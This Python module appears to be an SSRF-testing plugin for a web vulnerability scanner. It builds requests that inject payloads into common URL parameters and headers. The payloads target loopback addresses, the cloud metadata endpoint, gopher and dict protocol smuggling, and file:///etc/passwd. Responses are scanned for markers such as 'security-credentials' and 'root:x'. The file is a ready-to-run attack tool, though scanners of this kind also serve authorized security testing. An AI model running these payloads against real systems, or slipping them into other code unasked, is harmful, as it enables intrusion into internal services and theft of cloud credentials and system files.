from core.http import fetch

SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:80/",
    "http://[::1]/",
    "http://example.com@127.0.0.1/",
    "http://127.0.0.1:8080/",
    # Protocol smuggling
    "gopher://127.0.0.1:80/_",
    "dict://127.0.0.1:6379/info",
    "file:///etc/passwd",
    # DNS rebinding / alternate representations
    "http://0x7f000001/",
    "http://0177.0.0.1/",
    "http://127.000.000.001/",
]

# Parameters and headers commonly used to pass URLs
SSRF_PARAMS = ["url", "next", "redirect", "dest", "return", "data", "host", "server", "webhook", "callback", "target", "src"]
SSRF_HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Forwarded-Host", "Host", "X-Custom-IP-Authorization"]

REFLECTED_MARKERS = ["metadata", "instance-id", "security-credentials", "root:x", "info\r\nredis", "etc/passwd", "localhost"]


def generate_tasks(url, config):
    tasks = []
    oast_url = config.get("_oast_url")  # injected by orchestrator if interactsh is live

    discovered = config.get("discovered_params", [])
    all_params = list(dict.fromkeys(SSRF_PARAMS + discovered))

    for param in all_params:
        for payload in SSRF_PAYLOADS:
            tasks.append({
                "url": url,
                "method": "GET",
                "params": {param: payload},
                "type": "SSRF",
                "test_param": param,
                "executor": test_ssrf,
            })
        # OOB SSRF via interactsh
        if oast_url:
            tasks.append({
                "url": url,
                "method": "GET",
                "params": {param: oast_url},
                "type": "SSRF",
                "test_param": param,
                "oob": True,
                "executor": test_ssrf,
            })

    # Header-based SSRF
    for header in SSRF_HEADERS:
        for payload in ("http://127.0.0.1/", "http://169.254.169.254/"):
            tasks.append({
                "url": url,
                "method": "GET",
                "params": {},
                "headers": {header: payload},
                "type": "SSRF",
                "test_param": f"header:{header}",
                "executor": test_ssrf_header,
            })

    return tasks


async def test_ssrf(session, task):
    try:
        text, resp = await fetch(session, task["url"], params=task["params"])
        if resp and resp.status == 200 and text:
            vulnerable = any(marker in text.lower() for marker in REFLECTED_MARKERS)
            return {
                "type": "SSRF",
                "url": task["url"],
                "params": task["params"],
                "vulnerable": vulnerable,
                "oob": task.get("oob", False),
                "response": text[:500],
            }
        return {"type": "SSRF", "url": task["url"], "vulnerable": False}
    except Exception as exc:
        return {"type": "SSRF", "url": task["url"], "error": str(exc), "vulnerable": False}


async def test_ssrf_header(session, task):
    try:
        text, resp = await fetch(session, task["url"], headers=task.get("headers", {}))
        if resp and resp.status == 200 and text:
            vulnerable = any(marker in text.lower() for marker in REFLECTED_MARKERS)
            return {
                "type": "SSRF",
                "url": task["url"],
                "headers": task.get("headers"),
                "test_param": task.get("test_param"),
                "vulnerable": vulnerable,
                "response": text[:500],
            }
        return {"type": "SSRF", "url": task["url"], "vulnerable": False}
    except Exception as exc:
        return {"type": "SSRF", "url": task["url"], "error": str(exc), "vulnerable": False}
